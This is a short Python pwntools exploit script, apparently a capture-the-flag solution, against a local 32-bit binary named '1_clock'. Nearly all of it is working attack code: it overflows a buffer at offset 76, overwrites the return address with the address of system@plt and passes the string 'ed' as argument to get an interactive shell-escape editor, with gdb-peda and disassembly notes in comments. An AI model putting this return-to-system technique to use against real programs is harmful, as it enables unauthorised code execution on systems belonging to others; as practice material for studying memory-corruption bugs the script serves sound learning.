#!/usr/bin/python
from pwn import *

def main():
	# Start process
	p = process("./1_clock") 
	
	# Print pid
	#raw_input( str(p.proc.pid) )

	# Craft payload
	'''
	gdb-peda$ pattern_offset 0x41344141
	1093943617 found at offset: 76
	'''
	#payload = "A" * 76 + p32(0xdeadc0de)

	'''
	08048370 <system@plt>:
	 8048370:       ff 25 18 a0 04 08       jmp    *0x804a018
	 8048376:       68 18 00 00 00          push   $0x18
	 804837b:       e9 b0 ff ff ff          jmp    8048330 <_init+0x24>

	1_clock : 0x8048624 --> 0x646572 ('red')
	0x8048625:      "ed"	
	'''
	system_plt = p32(0x08048370)
	ed_str = p32(0x8048625) 
	nop = "\x90" * 4

	payload = "A" * 76 + system_plt + nop + ed_str 
	
	# Send the payload
	p.send(payload)

	# Pass interaction to user
	p.interactive() 

if __name__ == "__main__":
	main()
